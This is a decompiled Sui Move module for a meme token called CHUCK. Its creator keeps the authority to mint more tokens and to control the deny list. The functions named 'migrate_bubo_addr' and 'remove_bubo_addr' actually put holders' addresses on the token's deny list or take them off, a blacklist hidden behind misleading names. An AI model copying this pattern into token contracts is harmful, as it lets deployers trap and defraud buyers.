module 0x5799c4a74f5726850c89a3aa8f5acbcb867d406c34c4acf6549572ce0c930bc4::CHUCK {
    struct CHUCK has drop {
        dummy_field: bool,
    }

    fun init(arg0: CHUCK, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<CHUCK>(arg0, 6, b"CHUCK", b"Chuck", b"The Official CHUCK on Sui", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe_from_bytes(b"https://pump.mypinata.cloud/ipfs/QmeUTL27u1JD6dWWtarGBHzqbyhZRyrcytW6QYjZ8Gm3pn?img-width=256&img-dpr=2&img-onerror=redirect")), false, arg1);
        let v3 = v0;
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<CHUCK>>(v2);
        0x2::transfer::public_transfer<0x2::coin::Coin<CHUCK>>(0x2::coin::mint<CHUCK>(&mut v3, 1000000000000, arg1), 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::coin::TreasuryCap<CHUCK>>(v3, 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<CHUCK>>(v1, 0x2::tx_context::sender(arg1));
    }

    public entry fun migrate_bubo_addr(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<CHUCK>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<CHUCK>(arg0, arg1, arg2, arg3);
    }

    public entry fun remove_bubo_addr(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<CHUCK>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<CHUCK>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

